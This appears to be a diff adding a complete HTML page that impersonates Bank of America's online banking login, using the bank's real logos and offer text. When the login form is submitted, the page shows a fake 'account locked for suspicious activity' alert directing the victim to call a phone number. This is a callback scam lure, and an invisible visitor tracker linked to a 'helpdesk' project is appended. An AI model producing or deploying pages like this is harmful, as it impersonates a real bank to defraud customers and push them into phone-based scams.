@@ -1,1 +1,208 @@
-hi
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bank of America | Online Banking | Log In | User ID</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+
+    .header img {
+      width: 100%;
+      display: block;
+    }
+
+    .content-container {
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      gap: 30px;
+      margin: 50px auto;
+      max-width: 900px;
+      padding: 0 20px;
+    }
+
+    .login-container {
+      max-width: 400px;
+      background: white;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      flex: 1;
+    }
+
+    .llama-container img {
+      max-width: 300px;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      color: #003366;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+    }
+
+    .btn {
+      background-color: #0066cc;
+      color: white;
+      padding: 10px 20px;
+      text-decoration: none;
+      display: inline-block;
+      border-radius: 4px;
+      border: none;
+      cursor: pointer;
+    }
+
+    .error-message {
+      color: red;
+      margin-top: 20px;
+      display: none;
+      background: #ffe6e6;
+      padding: 10px;
+      border-radius: 5px;
+    }
+
+    footer {
+      background-color: #f5f2ee;
+      padding: 20px;
+      font-size: 14px;
+      text-align: center;
+      color: #333;
+      margin-top: 50px;
+    }
+
+    footer a {
+      text-decoration: none;
+      color: #0057b8;
+      margin: 0 8px;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+  <script>
+    function showLoginError() {
+      const errorBox = document.getElementById("error-message");
+      errorBox.style.display = "block";
+      errorBox.innerHTML = `
+        <strong>Your account has been locked.</strong>
+        <ul>
+          <li>Your account has been frozen due to suspicious activity.</li>
+          <li>Please call Bank of America at <strong>+1-810-314-2930</strong> to resolve the issue.</li>
+        </ul>
+      `;
+    }
+  </script>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <img src="https://www2.bac-assets.com/homepage/spa-assets/images/assets-images-global-logos-bac-logo-v2-CSX3648cbbb.svg" 
+         alt="Bank of America Header" />
+  </div>
+
+  <!-- Content Area with Form and Image -->
+  <div class="content-container">
+    <!-- Login Form -->
+    <div class="login-container">
+      <h1 style="color: red;">Log In to Online Banking</h1>
+      <form onsubmit="event.preventDefault(); showLoginError();">
+        <div class="form-group">
+          <label for="user-id">User ID:</label>
+          <input type="text" id="user-id" name="user-id" maxlength="32" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password:</label>
+          <input type="password" id="password" name="password" maxlength="20" required>
+        </div>
+        <button type="submit" class="btn">Log In</button>
+      </form>
+      <div id="error-message" class="error-message"></div>
+    </div>
+
+    <!-- Right-Side Image (Llama or branding) -->
+    <div class="llama-container">
+      <img src="https://secure.bankofamerica.com/pa/components/modules-app/VIPAA/online-id-vipaa-module/1.0/graphic/mobile_llama.png"
+           alt="Llama Image" />
+    </div>
+  </div>
+
+  <!-- Promotional Image and Offers Section -->
+  <div style="background-color: #f9f9f9; padding: 40px 20px; margin: 40px 0;">
+    <!-- Full-width Promo Image -->
+    <div style="text-align: center; margin-bottom: 30px;">
+      <img 
+        src="https://www2.bac-assets.com/homepage/spa-assets/images/assets-images-site-hp-assets-mastheads-icons-shl_offer_art_6819646_e.svg" 
+        alt="Bank of America Promotional Offers"
+        style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);"
+      />
+    </div>
+
+    <!-- Offer Blocks -->
+    <div style="max-width: 1100px; margin: auto; display: flex; flex-wrap: wrap; gap: 25px; justify-content: space-between;">
+      <div style="flex: 1 1 220px; min-width: 240px;">
+        <h3 style="color: #cc0000;">New Checking Offer</h3>
+        <p style="font-size: 20px; font-weight: bold;">Open a checking account</p>
+        <p>Earn a $300 cash offer when you open a new eligible checking account and make qualifying direct deposits.</p>
+        <a href="#" style="color: #0057b8; text-decoration: none;">See offer details &rarr;</a>
+      </div>
+
+      <div style="flex: 1 1 220px; min-width: 240px;">
+        <h3 style="color: #cc0000;">6% Customized Cash Back</h3>
+        <p style="font-size: 20px; font-weight: bold;">On your top spending category</p>
+        <p>Maximize rewards on groceries, travel, gas, and more when you use your Bank of America® credit card.</p>
+        <a href="#" style="color: #0057b8; text-decoration: none;">Learn more &rarr;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <p>&copy; 2025 Bank of America Corporation. All rights reserved.</p>
+    <p>
+      <a href="#">Privacy</a> | 
+      <a href="#">Security</a> | 
+      <a href="#">Terms of Use</a>
+    </p>
+  </footer>
+</body>
+  <!-- Default Statcounter code for micro
+https://micro-softs-helpdesks.vercel.app/ -->
+<script type="text/javascript">
+var sc_project=13141255; 
+var sc_invisible=1; 
+var sc_security="c6f9d922"; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="Web Analytics"
+href="https://statcounter.com/" target="_blank"><img
+class="statcounter"
+src="https://c.statcounter.com/13141255/0/c6f9d922/1/"
+alt="Web Analytics"
+referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
+<!-- End of Statcounter Code -->
+</html>
